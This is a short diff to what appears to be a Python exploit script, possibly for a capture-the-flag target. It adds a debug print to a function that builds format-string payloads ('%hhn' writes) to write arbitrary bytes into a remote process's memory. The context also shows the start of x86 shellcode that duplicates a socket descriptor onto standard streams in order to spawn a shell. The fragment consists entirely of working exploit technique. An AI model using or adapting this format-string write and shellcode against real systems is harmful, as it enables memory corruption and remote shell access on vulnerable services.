@@ -30,6 +30,7 @@ def interact(s):
 def writeByte(s, addr, val, idx):
     format = "%%%dc%%%d$hhn" % (val, idx + 4)
     format += "A"*(16 - len(format))
+    sys.stdout.write(format)
     s.send(format)
 
 sc ="\xbb\x04\x00\x00\x00\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80" + \
